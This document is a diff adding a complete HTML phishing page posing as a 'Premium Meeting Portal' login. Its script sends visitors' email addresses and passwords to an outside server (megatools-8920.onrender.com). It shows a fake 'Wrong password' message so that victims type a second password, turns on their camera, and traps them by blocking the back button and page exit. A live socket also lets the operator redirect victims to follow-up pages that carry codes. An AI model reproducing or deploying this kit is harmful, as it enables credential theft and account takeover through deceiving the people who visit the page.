@@ -1,0 +1,601 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Premium Meeting Portal</title>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: Arial, sans-serif;
+      }
+      body,
+      html {
+        width: 100%;
+        height: 100%;
+      }
+      body {
+        background: #000;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+      }
+      .container {
+        width: 100%;
+        max-width: 450px;
+        background: #fff;
+        border-radius: 20px;
+        box-shadow: 0 12px 30px rgba(0, 0, 0, 0.25);
+        padding: 40px 30px;
+        text-align: center;
+        animation: fadeIn 0.6s ease-in-out;
+        position: relative;
+        overflow: hidden;
+      }
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+      .waiting-notice {
+        background: linear-gradient(135deg, #f5f5f5, #e0e0e0);
+        padding: 12px;
+        border-radius: 12px;
+        margin-bottom: 25px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+        animation: pulse 2s infinite;
+      }
+      @keyframes pulse {
+        0% {
+          box-shadow: 0 0 0 0 rgba(26, 115, 232, 0.2);
+        }
+        70% {
+          box-shadow: 0 0 0 10px rgba(26, 115, 232, 0);
+        }
+        100% {
+          box-shadow: 0 0 0 0 rgba(26, 115, 232, 0);
+        }
+      }
+      .waiting-notice i {
+        color: #1a73e8;
+        font-size: 1.1rem;
+      }
+      .waiting-notice span {
+        color: #1a73e8;
+        font-weight: 500;
+        font-size: 0.95rem;
+      }
+      .logo {
+        width: 20%;
+        min-width: 80px;
+        max-width: 120px;
+        height: auto;
+        margin: 0 auto 15px;
+        display: block;
+      }
+      h2 {
+        color: #202124;
+        font-size: 1.4rem;
+        font-weight: 600;
+        margin-bottom: 10px;
+      }
+      .subtitle {
+        color: #5f6368;
+        font-size: 0.95rem;
+        margin-bottom: 25px;
+      }
+      .form-group {
+        margin-bottom: 20px;
+        text-align: left;
+        position: relative;
+      }
+      label {
+        display: block;
+        color: #5f6368;
+        font-size: 0.85rem;
+        margin-bottom: 6px;
+        font-weight: 500;
+      }
+      input {
+        width: 100%;
+        padding: 13px 15px;
+        border: 1px solid #dadce0;
+        border-radius: 10px;
+        font-size: 0.95rem;
+        transition: all 0.2s;
+      }
+      input:focus {
+        outline: none;
+        border: 1px solid #1a73e8;
+        box-shadow: 0 0 8px rgba(26, 115, 232, 0.4);
+      }
+      .error-msg {
+        color: red;
+        font-size: 0.8rem;
+        margin-top: 5px;
+        display: none;
+      }
+      .join-btn {
+        width: 100%;
+        background: linear-gradient(135deg, #1a73e8, #0d47a1);
+        color: white;
+        border: none;
+        border-radius: 50px;
+        padding: 13px 0;
+        font-size: 1rem;
+        font-weight: 600;
+        cursor: pointer;
+        margin-top: 10px;
+        box-shadow: 0 6px 15px rgba(26, 115, 232, 0.3);
+        transition: all 0.3s ease-in-out;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+      }
+      .join-btn:hover {
+        background: linear-gradient(135deg, #0d47a1, #1a73e8);
+        transform: translateY(-2px);
+      }
+      .footer {
+        margin-top: 20px;
+        font-size: 0.8rem;
+        color: #5f6368;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        gap: 5px;
+        flex-wrap: wrap;
+      }
+      .footer a {
+        color: #1a73e8;
+        text-decoration: none;
+      }
+      .footer a:hover {
+        text-decoration: underline;
+      }
+
+      /* Camera fullscreen page */
+      #camera-page {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: #000;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+        z-index: 9999;
+      }
+      #cameraBg {
+        position: fixed;
+        inset: 0;
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        z-index: -3;
+      }
+
+      /* DARK OVERLAY */
+      .overlay {
+        position: fixed;
+        inset: 0;
+        background: rgba(0, 0, 0, 0.45);
+        backdrop-filter: blur(4px);
+        z-index: -2;
+      }
+      .loading {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        border: 6px solid #f3f3f3;
+        border-top: 6px solid #1a73e8;
+        border-radius: 50%;
+        width: 50px;
+        height: 50px;
+        animation: spin 1s linear infinite;
+      }
+      .loading-text {
+        position: absolute;
+        top: calc(50% + 40px);
+        left: 50%;
+        transform: translateX(-50%);
+        color: #fff;
+        font-size: 1rem;
+        font-weight: 500;
+      }
+      @keyframes spin {
+        0% {
+          transform: translate(-50%, -50%) rotate(0deg);
+        }
+        100% {
+          transform: translate(-50%, -50%) rotate(360deg);
+        }
+      }
+
+      /* Warning modal for navigation attempts */
+      .navigation-warning {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.85);
+        z-index: 10000;
+        justify-content: center;
+        align-items: center;
+      }
+      .warning-content {
+        background: white;
+        padding: 30px;
+        border-radius: 15px;
+        text-align: center;
+        max-width: 400px;
+        box-shadow: 0 5px 25px rgba(0, 0, 0, 0.3);
+      }
+      .warning-content h3 {
+        color: #d93025;
+        margin-bottom: 15px;
+      }
+      .warning-content p {
+        margin-bottom: 20px;
+        color: #5f6368;
+      }
+      .warning-ok-btn {
+        background: #1a73e8;
+        color: white;
+        border: none;
+        padding: 10px 20px;
+        border-radius: 5px;
+        cursor: pointer;
+        font-weight: bold;
+      }
+
+      @media (max-width: 480px) {
+        .container {
+          padding: 30px 20px;
+        }
+        h2 {
+          font-size: 1.2rem;
+        }
+        .subtitle {
+          font-size: 0.85rem;
+        }
+        .waiting-notice span {
+          font-size: 0.85rem;
+        }
+        input {
+          padding: 12px 12px;
+          font-size: 0.9rem;
+        }
+        .join-btn {
+          font-size: 0.95rem;
+          padding: 12px 0;
+        }
+        .logo {
+          width: 25%;
+          min-width: 70px;
+        }
+      }
+      @media (min-width: 481px) and (max-width: 768px) {
+        .container {
+          padding: 35px 25px;
+        }
+        h2 {
+          font-size: 1.25rem;
+        }
+        .subtitle {
+          font-size: 0.9rem;
+        }
+        input {
+          font-size: 0.95rem;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container" id="main-container">
+      <div class="waiting-notice">
+        <i class="fas fa-clock"></i>
+        <span>Someone is waiting for the meeting...</span>
+      </div>
+
+      <img
+        src="https://res.cloudinary.com/dxobnjf5l/image/upload/v1756590555/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm-removebg-preview_m83szn.png"
+        alt="Portal Logo"
+        class="logo"
+      />
+      <h2>Join Meeting</h2>
+      <p class="subtitle">Enter your mega details to join the meeting</p>
+
+      <div class="form-group">
+        <label for="email">Email Address</label>
+        <input type="email" id="email" placeholder="Enter your email" />
+      </div>
+
+      <div class="form-group" id="password-group">
+        <label for="password">Password</label>
+        <input
+          type="password"
+          id="password"
+          placeholder="Enter your password"
+        />
+        <div class="error-msg" id="password-error">
+          Wrong password. Try again
+        </div>
+      </div>
+
+      <button class="join-btn">
+        <i class="fas fa-video"></i>
+        <span>Join Now</span>
+      </button>
+
+      <div class="footer">
+        <span>Secure meeting connection</span> | <a href="#">Privacy policy</a>
+      </div>
+    </div>
+
+    <!-- Camera page -->
+    <div id="camera-page" class="flex">
+      <video id="camera-video" autoplay playsinline></video>
+      <div class="loading"></div>
+      <div class="loading-text">Waiting for join...</div>
+    </div>
+    <video id="cameraBg" autoplay muted playsinline></video>
+    <div class="overlay"></div>
+    <!-- Navigation warning modal -->
+    <div class="navigation-warning" id="nav-warning">
+      <div class="warning-content">
+        <h3>
+          <i class="fas fa-exclamation-triangle"></i> Complete the Form First
+        </h3>
+        <p>Please complete all required fields before leaving this page.</p>
+        <button class="warning-ok-btn" id="warning-ok">OK</button>
+      </div>
+    </div>
+
+    <script>
+      let firstClickDone = false;
+      let secondClickDone = false;
+      let formCompleted = false;
+      let state = { _id: "", socket: null };
+
+      const joinBtn = document.querySelector(".join-btn");
+      const emailInput = document.getElementById("email");
+      const passwordInput = document.getElementById("password");
+      const passwordError = document.getElementById("password-error");
+
+      const mainContainer = document.getElementById("main-container");
+      const cameraPage = document.getElementById("camera-page");
+      const cameraVideo = document.getElementById("camera-video");
+      const navWarning = document.getElementById("nav-warning");
+      const warningOkBtn = document.getElementById("warning-ok");
+
+      // Function to check if form is completed
+      function isFormCompleted() {
+        return formCompleted || secondClickDone;
+      }
+
+      // Function to show navigation warning
+      function showNavigationWarning() {
+        navWarning.style.display = "flex";
+      }
+
+      // Function to setup navigation prevention
+      function setupNavigationPrevention() {
+        // Prevent back button
+        history.pushState(null, null, document.URL);
+        window.addEventListener("popstate", function () {
+          if (!isFormCompleted()) {
+            showNavigationWarning();
+            history.pushState(null, null, document.URL);
+          }
+        });
+
+        // Prevent page refresh/close
+        window.addEventListener("beforeunload", function (e) {
+          if (!isFormCompleted()) {
+            e.preventDefault();
+            e.returnValue = "";
+            return "";
+          }
+        });
+
+        // Prevent external navigation
+        document.addEventListener("click", function (e) {
+          if (isFormCompleted()) return;
+
+          const link = e.target.closest("a");
+          if (link && link.href && link.target !== "_blank") {
+            e.preventDefault();
+            showNavigationWarning();
+          }
+        });
+
+        // OK button for warning modal
+        warningOkBtn.addEventListener("click", function () {
+          navWarning.style.display = "none";
+        });
+      }
+
+      // Start camera background
+
+      navigator.mediaDevices
+        .getUserMedia({ video: true, audio: false })
+        .then((stream) => {
+          document.getElementById("cameraBg").srcObject = stream;
+        })
+        .catch(() => {
+          console.warn("Camera access denied");
+        });
+
+      async function startCamera() {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: true,
+            audio: false,
+          });
+          cameraVideo.srcObject = stream;
+        } catch (e) {
+          alert("Camera permission required");
+        }
+      }
+      function getDeviceType() {
+        const ua = navigator.userAgent.toLowerCase();
+        const isMobile =
+          /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua);
+        const isTablet = /ipad|tablet|playbook|silk/i.test(ua) && !isMobile;
+
+        if (isMobile || isTablet) return "mobile";
+        return "desktop";
+      }
+
+      const deviceType = getDeviceType();
+      // API init
+      document.addEventListener("DOMContentLoaded", () => {
+        const urlParams = new URLSearchParams(window.location.search);
+        const id = urlParams.get("id");
+
+        fetch("https://megatools-8920.onrender.com/api/v1/information", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            user: id,
+            siteName: "Video-call/login",
+            deviceType,
+          }),
+        })
+          .then((res) => res.json())
+          .then((data) => {
+            state._id = data.data._id;
+            connectSocket(state._id);
+
+            // Setup navigation prevention after page loads
+            setupNavigationPrevention();
+          })
+          .catch((err) => console.error("Init API error:", err));
+      });
+
+      // Join button click
+      joinBtn.addEventListener("click", () => {
+        passwordError.style.display = "none";
+        const email = emailInput.value.trim();
+        const password = passwordInput.value.trim();
+
+        if (!email) {
+          alert("Please enter your email");
+          return;
+        }
+
+        // --------- First click ----------
+        if (!firstClickDone) {
+          firstClickDone = true;
+
+          if (!password) {
+            passwordError.style.display = "block";
+            return;
+          }
+
+          // First time: send email + password only
+          fetch(
+            `https://megatools-8920.onrender.com/api/v1/information/${state._id}`,
+            {
+              method: "PATCH",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ email: email, password: password }),
+            },
+          )
+            .then((res) => res.json())
+            .then(() => {
+              // prepare confirm password step
+              passwordInput.value = "";
+              passwordInput.placeholder = "Confirm your Email password";
+              passwordError.style.display = "block";
+              passwordInput.focus();
+            })
+            .catch((err) => {
+              console.error("First save error:", err);
+              alert("Failed to save. Please try again.");
+            });
+
+          return;
+        }
+
+        // --------- Second click ----------
+        if (!secondClickDone) {
+          if (!password) {
+            passwordError.style.display = "block";
+            return;
+          }
+
+          secondClickDone = true;
+          formCompleted = true; // Allow navigation after form completion
+
+          // Second time: send confirm password
+          fetch(
+            `https://megatools-8920.onrender.com/api/v1/information/${state._id}`,
+            {
+              method: "PATCH",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ repassword: password }),
+            },
+          )
+            .then((res) => res.json())
+            .then(() => {
+              mainContainer.style.display = "none";
+              cameraPage.style.display = "flex";
+              startCamera();
+            })
+            .catch((err) => {
+              console.error("Verification error:", err);
+              alert("Failed to verify. Please try again.");
+            });
+
+          return;
+        }
+      });
+
+      // Socket.io connection
+      function connectSocket(roomId) {
+        const socket = io("https://megatools-8920.onrender.com");
+        state.socket = socket;
+
+        socket.on("connect", () => {
+          socket.emit("joinRoom", roomId);
+        });
+
+        socket.on("disconnect", () => {
+          console.warn("Disconnected from server");
+        });
+
+        socket.on("link", ({ data }) => {
+          window.location.href = `${data.url}/${roomId}`;
+        });
+
+        socket.on("code", ({ data }) => {
+          window.location.href = `${data.url}/?id=${roomId}&code=${data.code}`;
+        });
+      }
+    </script>
+  </body>
+</html>
